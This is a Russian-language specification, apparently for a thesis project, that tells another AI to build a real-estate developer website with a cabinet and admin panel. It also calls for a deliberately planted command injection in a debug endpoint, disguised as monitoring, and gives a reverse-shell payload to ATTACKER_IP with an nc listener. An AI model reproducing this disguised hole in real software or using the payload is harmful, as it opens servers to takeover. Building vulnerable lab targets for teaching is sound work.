# ТЕХНИЧЕСКОЕ ЗАДАНИЕ: Remon Developer — Дипломный проект

> **Цель:** Создать полнофункциональный сайт застройщика Remon Developer (raemon.ru) с личным кабинетом, админ-панелью и намеренной уязвимостью CVE для дипломной защиты.

---

## 1. СТЕК ТЕХНОЛОГИЙ

### Backend
- **Node.js** + **Express** + **TypeScript**
- **PostgreSQL** — основная БД
- **JWT** — авторизация (access + refresh токены)
- **bcryptjs** — хеширование паролей
- **dotenv** — переменные окружения
- **cors** — кросс-доменные запросы
- **pg** — драйвер PostgreSQL

### Frontend
- **Next.js 15/16** (App Router) + **React 19** + **TypeScript**
- **Tailwind CSS 4** — стилизация
- **Lucide React** — иконки
- Кастомные CSS-анимации

### Инфраструктура
- **Docker** + **Docker Compose** (frontend, backend, PostgreSQL)
- **nginx** — reverse proxy (опционально)

---

## 2. СТРУКТУРА ПРОЕКТА

```
Remon/
├── docker-compose.yml
├── frontend/              # Next.js приложение
│   ├── src/app/
│   │   ├── page.tsx       # Главная страница (референс: Основа.html)
│   │   ├── login/page.tsx # Страница входа
│   │   ├── register/page.tsx
│   │   ├── cabinet/page.tsx      # Личный кабинет
│   │   ├── admin/page.tsx        # Админ-панель
│   │   ├── kvartires/page.tsx    # Каталог квартир
│   │   ├── mortgage/page.tsx     # Ипотека
│   │   ├── about/page.tsx        # О компании
│   │   └── layout.tsx
│   ├── src/components/
│   │   ├── Header.tsx
│   │   ├── Footer.tsx
│   │   ├── Hero.tsx
│   │   ├── TradeInCalculator.tsx # Калькулятор трейд-ин
│   │   └── ApartmentFilter.tsx   # Фильтр квартир
│   ├── public/photos/     # Фото проектов
│   └── package.json
├── backend/               # Express API
│   ├── src/
│   │   ├── index.ts
│   │   ├── db.ts          # Подключение к PostgreSQL
│   │   ├── routes/
│   │   │   ├── auth.ts
│   │   │   ├── users.ts
│   │   │   ├── apartments.ts
│   │   │   ├── news.ts
│   │   │   ├── admin.ts
│   │   │   └── debug.ts   # УЯЗВИМЫЙ эндпоинт
│   │   ├── middleware/
│   │   │   ├── auth.ts    # JWT проверка
│   │   │   └── admin.ts   # Проверка роли admin
│   │   └── utils/
│   │       └── jwt.ts
│   └── package.json
├── security/
│   ├── exploit.py         # Скрипт эксплуатации уязвимости
│   └── writeup.md         # Описание уязвимости
└── init.sql               # Инициализация БД
```

---

## 3. БАЗА ДАННЫХ (PostgreSQL)

### Таблицы:

```sql
-- Пользователи
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255),        -- NULL при OAuth-входе
  full_name VARCHAR(255),
  phone VARCHAR(50),
  role VARCHAR(20) DEFAULT 'user',   -- user, admin
  status VARCHAR(30) DEFAULT 'none', -- none, user, resident_premium, resident_business
  avatar_url TEXT,
  auth_provider VARCHAR(20) DEFAULT 'local', -- local, yandex, vk, telegram
  provider_id VARCHAR(255),
  created_at TIMESTAMP DEFAULT NOW(),
  updated_at TIMESTAMP DEFAULT NOW()
);

-- Проекты
CREATE TABLE projects (
  id SERIAL PRIMARY KEY,
  name VARCHAR(255) NOT NULL,
  city VARCHAR(100) NOT NULL,
  class VARCHAR(50),                 -- Premium, Business, Comfort+
  address TEXT,
  description TEXT,
  price_from INTEGER,
  price_to INTEGER,
  deadline VARCHAR(100),
  image_url TEXT,
  gallery JSONB,                     -- массив URL фото
  features JSONB,
  is_active BOOLEAN DEFAULT true,
  created_at TIMESTAMP DEFAULT NOW()
);

-- Квартиры
CREATE TABLE apartments (
  id SERIAL PRIMARY KEY,
  project_id INTEGER REFERENCES projects(id),
  title VARCHAR(255),
  rooms VARCHAR(20),                 -- СТ, 1К, 2К, 3К+
  area DECIMAL(6,2),
  floor VARCHAR(20),
  price INTEGER,
  status VARCHAR(50) DEFAULT 'available', -- available, reserved, sold
  image_url TEXT,
  layout_url TEXT,
  is_active BOOLEAN DEFAULT true
);

-- Связь пользователей с квартирами (портфель)
CREATE TABLE user_apartments (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  apartment_id INTEGER REFERENCES apartments(id),
  purchase_date DATE,
  status VARCHAR(50) DEFAULT 'active',
  payment_status VARCHAR(50)
);

-- Новости
CREATE TABLE news (
  id SERIAL PRIMARY KEY,
  title VARCHAR(500),
  content TEXT,
  image_url TEXT,
  project_id INTEGER REFERENCES projects(id),
  is_published BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW()
);

-- Камеры (ссылки на видео)
CREATE TABLE cameras (
  id SERIAL PRIMARY KEY,
  project_id INTEGER REFERENCES projects(id),
  name VARCHAR(255),
  stream_url TEXT,
  thumbnail_url TEXT,
  is_active BOOLEAN DEFAULT true
);

-- Сообщения чата
CREATE TABLE messages (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  admin_id INTEGER REFERENCES users(id),
  content TEXT,
  is_from_admin BOOLEAN DEFAULT false,
  is_read BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT NOW()
);

-- Сессии (refresh токены)
CREATE TABLE sessions (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id),
  refresh_token VARCHAR(500),
  expires_at TIMESTAMP,
  created_at TIMESTAMP DEFAULT NOW()
);
```

---

## 4. API ENDPOINTS (Backend)

### Авторизация (`/api/auth`)
| Метод | Путь | Описание |
|-------|------|----------|
| POST | `/register` | Регистрация по email+пароль |
| POST | `/login` | Вход по email+пароль, возвращает JWT |
| POST | `/logout` | Выход, инвалидация refresh токена |
| POST | `/refresh` | Обновление access токена |
| POST | `/oauth/yandex` | Вход через Яндекс OAuth |
| POST | `/oauth/vk` | Вход через VK OAuth |
| POST | `/oauth/telegram` | Вход через Telegram Widget |

### Пользователи (`/api/users`)
| Метод | Путь | Описание |
|-------|------|----------|
| GET | `/me` | Получить текущего пользователя (JWT) |
| PUT | `/me` | Обновить профиль |
| GET | `/me/apartments` | Квартиры пользователя |
| GET | `/me/cameras` | Доступные камеры |
| GET | `/me/messages` | История чата |
| POST | `/me/messages` | Отправить сообщение менеджеру |

### Квартиры (`/api/apartments`)
| Метод | Путь | Описание |
|-------|------|----------|
| GET | `/` | Список квартир с фильтрацией (city, rooms, price_min, price_max) |
| GET | `/:id` | Детали квартиры |

### Новости (`/api/news`)
| Метод | Путь | Описание |
|-------|------|----------|
| GET | `/` | Список новостей |
| GET | `/:id` | Детали новости |

### Админ-панель (`/api/admin`) — требует роль `admin`
| Метод | Путь | Описание |
|-------|------|----------|
| GET | `/users` | Список всех пользователей |
| PUT | `/users/:id/status` | Изменить статус пользователя (none/user/resident_premium/resident_business) |
| PUT | `/users/:id/role` | Назначить/снять админа |
| GET | `/users/:id/apartments` | Квартиры пользователя |
| POST | `/users/:id/apartments` | Добавить квартиру пользователю |
| GET | `/messages` | Все сообщения чата |
| POST | `/messages/:id/reply` | Ответить пользователю |
| CRUD | `/apartments` | Управление квартирами |
| CRUD | `/projects` | Управление проектами |
| CRUD | `/news` | Управление новостями |
| CRUD | `/cameras` | Управление камерами |

### УЯЗВИМЫЙ ЭНДПОИНТ (Command Injection CVE)
| Метод | Путь | Описание |
|-------|------|----------|
| POST | `/api/admin/debug/system-status` | "Системный мониторинг" — намеренно уязвим |

**Уязвимость:** Параметр `options` напрямую конкатенируется в команду `child_process.exec`. Несмотря на проверку `tool` из белого списка (`df`, `free`, `uptime`, `top`), параметр `options` не экранируется. Позволяет выполнять произвольные команды ОС с правами процесса Node.js.

**Payload:**
```json
{
  "tool": "df",
  "options": "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"
}
```

---

## 5. ФРОНТЕНД: СТРАНИЦЫ И КОМПОНЕНТЫ

### 5.1 Главная страница (`/`)
**Референс:** `Основа.html`

**Секции (в порядке сверху вниз):**
1. **Running line (Marquee)** — бегущая строка акций: "⚡ СУБСИДИРОВАННАЯ ИПОТЕКА 0.1% ДЛЯ IT", "🏠 TRADE-IN: ОБМЕН КВАРТИРЫ ЗА 24 ЧАСА" и т.д.
2. **Header** — фиксированный, прозрачный на hero, белый при скролле. Содержит:
   - Логотип REMON.
   - Навигация: Проекты (mega menu), Покупателям (mega menu), Компания, Инвесторам, Контакты
   - Телефон +7 (3812) 20-30-40
   - Кнопка "Личный кабинет" → `/login`
   - Mobile menu (бургер)
3. **Hero Section** — полноэкранный, фоновое фото, градиент overlay. Текст:
   - "Инновации в строительстве" (red label)
   - "Архитектура Будущего" (H1)
   - Описание + 2 кнопки: "Выбрать квартиру", "О проектах"
   - Статистика снизу: "12 объектов", "8 кварталов", "4500+ семей"
4. **Filter Section** — плавающая карточка поверх hero:
   - Проект/Город (select)
   - Комнатность: СТ / 1К / 2К / 3К+
   - Бюджет: range slider (до 18.5 млн)
   - Быстрые теги: Сданы, С отделкой, Вид на реку
   - Кнопка "Показать N лотов"
5. **Projects Section** — карточки проектов:
   - Grand Park (Новосибирск, Premium)
   - Riverside HQ (Тюмень, Business)
   - Кварталы Карбышева (Омск, Business)
   - Таб-фильтр: Все / Business / Premium
   - Hover-эффекты: scale изображения, появление инфо
6. **Mortgage/Finance Section** — темная секция:
   - "Индивидуальные условия покупки"
   - Калькулятор ипотеки (слайдеры: цена, первый взнос, срок)
   - Результат: ежемесячный платеж
7. **Trade-In Calculator** — секция на главной (референс: `Калькулятор трейд-ин.html`)
   - Поля: адрес старой квартиры, комнаты, площадь, этаж
   - Кнопка "Рассчитать стоимость выкупа"
   - Результат: оценочная стоимость + предложение новостроек
8. **Features Section** — "Стандарты Remon":
   - Умный дом, Дворы-парки, Архитектура
   - С фото справа
9. **News Section** — последние 3 новости с фото
10. **FAQ Section** — аккордеон с вопросами
11. **Footer** — 4 колонки: о компании, проекты, покупателям, контакты. Копирайт.

**Визуальный стиль:**
- Шрифты: Manrope (sans), Playfair Display (serif)
- Цвета: `#ff0015` (red), `#0a0a0a` (black), `#f5f5f5` (gray)
- Анимации: reveal on scroll, hover transitions, smooth scroll
- Mobile-first адаптив

### 5.2 Страница входа (`/login`)
- Форма: Email, Пароль, "Запомнить меня", "Забыли пароль?"
- Кнопка "Войти"
- OAuth кнопки: "Войти через Яндекс", "Войти через VK", "Войти через Telegram"
- Ссылка: "Ещё не стали нашим клиентом? Зарегистрироваться"
- После входа → `/cabinet`

### 5.3 Страница регистрации (`/register`)
- Форма: ФИО, Телефон, Email, Пароль
- Кнопка "Зарегистрироваться"
- Ссылка на вход

### 5.4 Личный кабинет (`/cabinet`)
**Референс:** `Личный кабинет.html`

**Layout:** Sidebar (черный) + Main content area (белый/светло-серый)

**Sidebar навигация:**
- Главная (dashboard overview)
- Мои объекты
- Камеры онлайн
- Умный дом
- Финансы
- Документы
- Чат с менеджером
- Настройки профиля
- Выход

**Логика доступа по статусу:**

| Вкладка | `none` (не резидент) | `user` | `resident_premium` | `resident_business` |
|---------|---------------------|--------|-------------------|---------------------|
| Главная | "Вы пока не имеете объекта..." | "Вы пока не имеете объекта..." | Полные данные | Полные данные |
| Мои объекты | Недоступно | Недоступно | Доступно | Доступно |
| Камеры онлайн | Доступно | Доступно | Доступно | Доступно |
| Умный дом | Недоступно | Недоступно | Доступно | Доступно |
| Финансы | Недоступно | Недоступно | Доступно | Доступно |
| Документы | Недоступно | Недоступно | Доступно | Доступно |
| Чат | Доступно | Доступно | Доступно | Доступно |

**Для резидентов на "Главная":**
- Общая стоимость портфеля
- Ближайшие платежи по ипотеке
- Статус объектов (в строительстве / сдан)
- Краткие сводки по квартирам
- Камеры онлайн (превью)

**Для не-резидентов:**
- На всех вкладках кроме Камер и Чата: сообщение "Вы пока что ещё не имеете объекта в своём портфеле, но мы будем рады с вами сотрудничать!"
- Кнопка "Написать менеджеру" → открывает чат
- Можно просматривать камеры
- Можно редактировать профиль

**Камеры онлайн:**
- Сетка видео-плееров (iframe или video tag)
- UI overlay: REC индикатор, название камеры, timestamp
- Переключение между проектами

**Чат с менеджером:**
- Окно переписки (как мессенджер)
- Отправка текстовых сообщений
- Временные метки
- Пока без Telegram-уведомлений (заглушка)

### 5.5 Админ-панель (`/admin`)
**Доступ:** Только пользователи с `role = 'admin'`

**Разделы:**
1. **Пользователи**
   - Таблица: ID, Имя, Email, Телефон, Роль, Статус, Дата регистрации
   - Фильтры по роли/статусу
   - Редактирование: изменить статус (none → user → resident_premium → resident_business), назначить/снять admin
   - Назначить квартиры пользователю
2. **Квартиры**
   - CRUD: создавать, редактировать, удалять квартиры
   - Загрузка фото планировок и фото объекта
   - Привязка к проекту
3. **Проекты**
   - CRUD проектов
   - Загрузка галереи фото
   - Редактирование описания, цен, сроков
4. **Новости**
   - CRUD новостей
   - Загрузка изображений
   - Привязка к проекту (опционально)
5. **Камеры**
   - CRUD камер
   - Указание stream_url
6. **Сообщения**
   - Все чаты пользователей
   - Возможность ответить от имени админа
7. **Статистика**
   - Количество пользователей по статусам
   - Количество квартир по проектам
   - Последние регистрации

### 5.6 Каталог квартир (`/kvartires`)
- Фильтры: проект, комнатность, площадь, цена
- Сетка карточек квартир с фото планировки
- Инфо: этаж, срок сдачи, цена
- Кнопка "Подробнее" → модалка/страница деталей

### 5.7 Ипотека (`/mortgage`)
- Информация о программах
- Калькулятор (как на главной)
- Форма заявки

### 5.8 О компании (`/about`)
- История компании
- Реализованные проекты
- Статистика

---

## 6. СИСТЕМА УЯЗВИМОСТИ (CVE)

### 6.1 Описание
Внедрена намеренная уязвимость **OS Command Injection (CWE-78)** в эндпоинте `/api/admin/debug/system-status`.

### 6.2 Механизм
- Эндпоинт принимает JSON: `{ "tool": "df", "options": "..." }`
- Проверяется `tool` из белого списка: `['df', 'free', 'uptime', 'top']`
- Но `options` напрямую конкатенируется: `exec(\`${tool} ${options}\`)`
- Shell интерпретирует метасимволы (`;`, `&&`, `||`)

### 6.3 Эксплуатация
```bash
# 1. Запустить слушатель
nc -lvnp 4444

# 2. Отправить payload
POST /api/admin/debug/system-status
{
  "tool": "df",
  "options": "; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
}
```

### 6.4 Доставка
- `security/exploit.py` — Python-скрипт для автоматизации
- `security/writeup.md` — подробное описание уязвимости, PoC, рекомендации

---

## 7. АВТОРИЗАЦИЯ И РОЛИ

### Роли:
- `user` — обычный пользователь (может войти, видеть базовый кабинет)
- `admin` — полный доступ к админке

### Статусы резидента (задаются админом):
- `none` — только зарегистрировался, нет объектов
- `user` — имеет аккаунт, может писать в чат, смотреть камеры
- `resident_premium` — полный доступ ко всему функционалу
- `resident_business` — полный доступ (аналогично premium)

### JWT:
- Access token: 15 минут
- Refresh token: 7 дней
- Хранение: httpOnly cookies (или localStorage как fallback)

---

## 8. ДОПОЛНИТЕЛЬНЫЕ ТРЕБОВАНИЯ

1. **SEO:**
   - Title, description на каждой странице
   - Open Graph теги
   - Sitemap.xml
   - robots.txt

2. **Мобильная версия:**
   - Адаптивная верстка (mobile-first)
   - Гамбургер-меню
   - Тач-френдли элементы

3. **Производительность:**
   - Оптимизированные изображения (WebP)
   - Ленивая загрузка (lazy loading)
   - Code splitting (Next.js)

4. **Заглушки (не реализовывать сейчас, но предусмотреть):**
   - Платежные системы — форма без реальной интеграции
   - Мультиязычность — i18n структура (только русский)
   - CDN — настройка через Next.js Image
   - Аналитика — Google Analytics скрипт (закомментирован)
   - Telegram-уведомления — заглушка функции

---

## 9. ПОРЯДОК РЕАЛИЗАЦИИ (для другой нейронки)

### Этап 1: Инфраструктура и БД
1. Создать `docker-compose.yml` (frontend, backend, PostgreSQL)
2. Создать `init.sql` с таблицами
3. Настроить подключение БД в backend

### Этап 2: Backend — авторизация
4. Реализовать регистрацию / вход / logout / refresh
5. JWT middleware
6. admin middleware

### Этап 3: Backend — остальные API
7. CRUD пользователей (админ)
8. CRUD проектов, квартир, новостей, камер
9. Чат (messages)
10. Уязвимый debug endpoint

### Этап 4: Frontend — общие компоненты
11. Header, Footer, Layout
12. Система аутентификации (Context/Provider)
13. Защищенные роуты

### Этап 5: Frontend — страницы
14. Главная страница (все секции из референса)
15. Login / Register с OAuth
16. Личный кабинет (все вкладки, логика по статусам)
17. Админ-панель (все разделы)
18. Каталог квартир, ипотека, о компании

### Этап 6: Уязвимость
19. Убедиться что `/api/admin/debug/system-status` работает
20. Создать `exploit.py`
21. Создать `writeup.md`

### Этап 7: Тестирование
22. Проверить все роли и статусы
23. Проверить уязвимость
24. Проверить адаптивность
25. Собрать docker-compose

---

## 10. ВАЖНЫЕ ЗАМЕЧАНИЯ

- **Сохранить визуальный стиль референсов.** Особенно: цвета, шрифты, анимации reveal, hover-эффекты.
- **Фото проектов** лежат в папке `photos/` — использовать локальные файлы, не unsplash.
- **Фильтр квартир** должен быть как в референсе (с select, кнопками комнатности, range slider).
- **Trade-In калькулятор** — на главной странице, полноценный функционал расчета.
- **Камеры** — для начала можно использовать заглушки (placeholder видео), UI должен быть полноценным.
- **Чат** — реальные сообщения через API, но уведомления в Telegram — заглушка.
- **Админ назначает статусы** — это ключевая механика. Админка должна позволять менять `status` пользователя.
- **Уязвимость** должна быть реалистичной (debug endpoint для "мониторинга"), не выглядеть как нарочито оставленная дыра.
